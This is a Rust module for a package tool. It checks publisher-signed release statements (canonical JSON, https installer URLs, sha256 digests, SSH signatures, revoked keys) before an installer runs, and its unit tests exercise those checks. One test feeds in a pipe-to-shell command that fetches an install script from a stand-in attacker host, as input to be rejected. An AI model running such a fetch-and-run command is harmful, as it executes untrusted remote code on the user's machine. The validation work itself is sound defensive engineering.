//! W3BS-SIGN-1 release statements: what a publisher signs, and how a catalog entry's
//! signature is checked before its installer runs.

use crate::error::{Error, Result};
use crate::sshsig::{self, PublicKey, SigError};
use serde_json::Value;
use w3bs_schema::PackageId;
use w3bs_schema::manifest::CatalogEntry;

pub const STATEMENT_TYPE: &str = "w3bs-release/1";

/// The signed bytes: RFC 8785 (JCS) canonical JSON of the statement.
pub fn statement_bytes(statement: &Value) -> Result<Vec<u8>> {
    serde_jcs::to_vec(statement).map_err(|e| Error::usage("INVALID_STATEMENT", format!("cannot canonicalize the release statement: {e}")))
}

fn is_sha256_hex(s: &str) -> bool {
    s.len() == 64 && s.bytes().all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
}

/// An https URL; with `loopback_http`, also http on localhost (development and tests).
fn https(u: &str, loopback_http: bool) -> bool {
    url::Url::parse(u).is_ok_and(|p| {
        let loopback = matches!(p.host_str(), Some("localhost" | "127.0.0.1" | "[::1]"));
        p.host_str().is_some() && (p.scheme() == "https" || (loopback_http && loopback && p.scheme() == "http"))
    }) && !u.chars().any(|c| c.is_whitespace() || c.is_control())
}

/// The URL in `curl -fsSL <url> | sh` (or `| bash`), if the line has exactly that shape.
pub fn install_line_url(line: &str) -> Option<&str> {
    let rest = line.trim().strip_prefix("curl -fsSL ")?;
    let (url, shell) = rest.split_once(" | ")?;
    (matches!(shell.trim(), "sh" | "bash") && !url.contains(char::is_whitespace)).then_some(url)
}

/// Check a statement against W3BS-SIGN-1 §3 before it is signed or submitted.
pub fn check_statement(s: &Value) -> std::result::Result<(), String> {
    check_statement_with(s, false)
}

/// [`check_statement`], optionally admitting http URLs on loopback (development only).
pub fn check_statement_with(s: &Value, loopback_http: bool) -> std::result::Result<(), String> {
    let o = s.as_object().ok_or("the statement must be a JSON object")?;
    let text = |k: &str| o.get(k).and_then(Value::as_str).filter(|v| !v.is_empty()).ok_or(format!("`{k}` is required"));
    if text("type")? != STATEMENT_TYPE {
        return Err(format!("`type` must be {STATEMENT_TYPE}"));
    }
    text("package")?.parse::<PackageId>().map_err(|e| format!("`package`: {e}"))?;
    semver::Version::parse(text("version")?).map_err(|e| format!("`version` is not semver: {e}"))?;
    text("name")?;
    text("description")?;
    let installer = o.get("installer").and_then(Value::as_object).ok_or("`installer` {url, sha256} is required")?;
    let iurl = installer.get("url").and_then(Value::as_str).ok_or("`installer.url` is required")?;
    if !https(iurl, loopback_http) {
        return Err("`installer.url` must be an https:// URL".into());
    }
    if !installer.get("sha256").and_then(Value::as_str).is_some_and(is_sha256_hex) {
        return Err("`installer.sha256` must be 64 lowercase hex digits".into());
    }
    match install_line_url(text("install")?) {
        Some(u) if u == iurl => {}
        Some(_) => return Err("the URL in `install` must equal `installer.url`".into()),
        None => return Err("`install` must be `curl -fsSL https://… | sh`".into()),
    }
    if let Some(arts) = o.get("artifacts") {
        for a in arts.as_array().ok_or("`artifacts` must be an array")? {
            let ok = a["target"].as_str().is_some_and(|t| !t.is_empty()) && a["url"].as_str().is_some_and(|u| https(u, loopback_http)) && a["sha256"].as_str().is_some_and(is_sha256_hex);
            if !ok {
                return Err("each artifact needs `target`, an https `url` and `sha256`".into());
            }
        }
    }
    if let Some(c) = o.get("commands")
        && !c.as_array().is_some_and(|a| a.iter().all(|x| x.as_str().is_some_and(|s| !s.is_empty())))
    {
        return Err("`commands` must be an array of command names".into());
    }
    let created = text("created_at")?;
    if !created.ends_with('Z') || created.parse::<jiff::Timestamp>().is_err() {
        return Err("`created_at` must be an RFC 3339 UTC time (…Z)".into());
    }
    Ok(())
}

/// A catalog entry whose publisher signature verified.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct VerifiedRelease {
    /// Publisher namespace: the package identity before `/`.
    pub namespace: String,
    pub fingerprint: String,
    pub version: String,
    pub installer_sha256: String,
}

fn sig_err(id: &PackageId, e: SigError) -> Error {
    Error::package("SIGNATURE_INVALID", format!("{id}: publisher signature rejected: {e}"))
}

/// Verify a catalog entry's `signed` block (W3BS-SIGN-1 §6 steps 1–2). `Ok(None)` for an
/// unsigned entry. Pinning (step 3) and the installer digest (step 4) are the caller's.
pub fn verify_entry(entry: &CatalogEntry) -> Result<Option<VerifiedRelease>> {
    let Some(signed) = &entry.signed else { return Ok(None) };
    let id = &entry.id;
    let bad = |m: String| Error::package("SIGNATURE_INVALID", format!("{id}: {m}"));
    if let Some(at) = &signed.revoked_at {
        return Err(Error::package("SIGNING_KEY_REVOKED", format!("{id}: the publisher revoked the key that signed this release ({}, {at}); W3BS will not install it", signed.fingerprint)));
    }
    let key = PublicKey::parse_openssh(&signed.public_key).map_err(|e| sig_err(id, e))?;
    if key.fingerprint() != signed.fingerprint {
        return Err(bad(format!("the listed fingerprint {} is not that of the listed key ({})", signed.fingerprint, key.fingerprint())));
    }
    let bytes = statement_bytes(&signed.statement)?;
    let v = sshsig::verify(&signed.signature, sshsig::NS_RELEASE, &bytes, Some(&key)).map_err(|e| sig_err(id, e))?;
    let st = &signed.statement;
    if st["type"] != STATEMENT_TYPE {
        return Err(bad(format!("the signed statement is not {STATEMENT_TYPE}")));
    }
    if st["package"].as_str() != Some(&id.to_string()) {
        return Err(bad(format!("the signature is for {}, not this package", st["package"])));
    }
    let version = st["version"].as_str().ok_or_else(|| bad("the signed statement has no version".into()))?;
    if let Some(latest) = &entry.latest_version
        && latest != version
    {
        return Err(bad(format!("the catalog lists {latest} but the signed release is {version}")));
    }
    if st["installer"]["url"].as_str() != Some(entry.install.url.as_str()) {
        return Err(bad(format!("the catalog installer {} is not the signed installer {}", entry.install.url, st["installer"]["url"])));
    }
    let sha = st["installer"]["sha256"].as_str().filter(|s| is_sha256_hex(s)).ok_or_else(|| bad("the signed statement has no installer sha256".into()))?;
    Ok(Some(VerifiedRelease { namespace: id.publisher().to_owned(), fingerprint: v.fingerprint, version: version.to_owned(), installer_sha256: sha.to_owned() }))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn fx(name: &str) -> String {
        std::fs::read_to_string(std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/sshsig").join(name)).unwrap()
    }

    fn signed_entry() -> CatalogEntry {
        let statement: Value = serde_json::from_str(&fx("release.jcs.json")).unwrap();
        serde_json::from_value(json!({
            "id": "example.com/tool", "name": "tool", "description": "fixture",
            "install": {"url": "https://example.com/install.sh", "shell": "sh"},
            "latest_version": "1.0.0",
            "signed": {"statement": statement, "signature": fx("release.ed25519.sig"), "public_key": fx("ed25519.pub").trim(), "fingerprint": fx("ed25519.fp").trim()}
        }))
        .unwrap()
    }

    #[test]
    fn fixture_is_jcs() {
        let v: Value = serde_json::from_str(&fx("release.jcs.json")).unwrap();
        assert_eq!(statement_bytes(&v).unwrap(), fx("release.jcs.json").into_bytes());
        check_statement(&v).unwrap();
    }

    #[test]
    fn signed_entry_verifies() {
        let v = verify_entry(&signed_entry()).unwrap().unwrap();
        assert_eq!((v.namespace.as_str(), v.version.as_str(), v.fingerprint.as_str()), ("example.com", "1.0.0", fx("ed25519.fp").trim()));
        assert_eq!(v.installer_sha256, "0".repeat(64));
        let mut e = signed_entry();
        e.signed = None;
        assert_eq!(verify_entry(&e).unwrap(), None);
    }

    #[test]
    fn entry_mismatches_refused() {
        let code = |e: CatalogEntry| verify_entry(&e).unwrap_err().code;
        let mut e = signed_entry();
        e.latest_version = Some("1.0.1".into());
        assert_eq!(code(e), "SIGNATURE_INVALID");
        let mut e = signed_entry();
        e.install.url = "https://example.com/other.sh".into();
        assert_eq!(code(e), "SIGNATURE_INVALID");
        let mut e = signed_entry();
        e.id = "example.com/tool2".parse().unwrap();
        e.name = "tool2".into();
        assert_eq!(code(e), "SIGNATURE_INVALID");
        // A changed statement no longer matches its signature.
        let mut e = signed_entry();
        e.signed.as_mut().unwrap().statement["installer"]["sha256"] = json!("1".repeat(64));
        assert_eq!(code(e), "SIGNATURE_INVALID");
        // Another key, or a fingerprint that is not the key's.
        let mut e = signed_entry();
        let s = e.signed.as_mut().unwrap();
        s.public_key = fx("ecdsa.pub").trim().into();
        s.fingerprint = fx("ecdsa.fp").trim().into();
        assert_eq!(code(e), "SIGNATURE_INVALID");
        let mut e = signed_entry();
        e.signed.as_mut().unwrap().fingerprint = fx("ecdsa.fp").trim().into();
        assert_eq!(code(e), "SIGNATURE_INVALID");
        let mut e = signed_entry();
        e.signed.as_mut().unwrap().revoked_at = Some("2026-10-19T00:00:00Z".into());
        assert_eq!(code(e), "SIGNING_KEY_REVOKED");
    }

    #[test]
    fn statement_rules() {
        let good: Value = serde_json::from_str(&fx("release.jcs.json")).unwrap();
        let bad = |k: &str, v: Value| {
            let mut s = good.clone();
            s[k] = v;
            check_statement(&s).is_err()
        };
        assert!(bad("type", json!("w3bs-release/2")));
        assert!(bad("version", json!("1.0")));
        assert!(bad("name", json!("")));
        assert!(bad("package", json!("no-slash")));
        assert!(bad("install", json!("curl -fsSL https://evil.example/install.sh | sh")));
        assert!(bad("install", json!("wget https://example.com/install.sh")));
        assert!(bad("created_at", json!("yesterday")));
        assert!(bad("artifacts", json!([{ "target": "linux-x86_64", "url": "http://x/y", "sha256": "0".repeat(64) }])));
        assert!(!bad("artifacts", json!([{ "target": "linux-x86_64", "url": "https://x/y", "sha256": "0".repeat(64) }])));
        assert_eq!(install_line_url("curl -fsSL https://a.b/i.sh | bash"), Some("https://a.b/i.sh"));
        let mut local = good.clone();
        local["installer"]["url"] = json!("http://127.0.0.1:9/install.sh");
        local["install"] = json!("curl -fsSL http://127.0.0.1:9/install.sh | sh");
        assert!(check_statement(&local).is_err());
        check_statement_with(&local, true).unwrap();
    }
}
